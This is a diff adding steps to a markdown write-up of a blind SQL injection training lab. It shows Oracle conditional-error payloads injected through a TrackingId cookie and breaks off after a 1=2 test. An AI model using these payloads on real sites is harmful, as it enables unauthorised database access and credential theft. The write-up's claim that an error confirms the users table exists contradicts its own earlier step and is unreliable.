@@ -18,3 +18,41 @@
 - find Administartor password
 - log in as administartor
 # Solving The lab
+- Visit the front page of the shop
+- intercept and modify the request containing the TrackingId cookie
+- Modify the TrackingId cookie, appending a single quotation mark to it
+```
+TrackingId=xyz'
+```
+- we see internal server error
+- Now change it to two quotation marks and the error disappears
+- to confirm that the server is interpreting the injection as a SQL query ,that the error is a SQL syntax error as opposed to any other kind of error
+- first need to construct a subquery using valid SQL syntax
+```
+TrackingId=xyz'||(SELECT '')||'
+```
+- query still appears to be invalid maybe we are dealing with oracle db so we need to inserf from caluse
+```
+TrackingId=xyz'||(SELECT '' FROM dual)||'
+```
+- query look valid and we got a 200 response
+- now submitting an invalid query while still preserving valid SQL syntax
+```
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
+```
+- we got internal server error
+- can use this error response to infer key information about the database. For example, in order to verify that the users table exists
+```
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+```
+- WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row
+- we confirmed that users table exists because we got internal server error
+- now exploit this behavior to test conditions
+```
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+- an error message is received
+- Now change it
+```
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
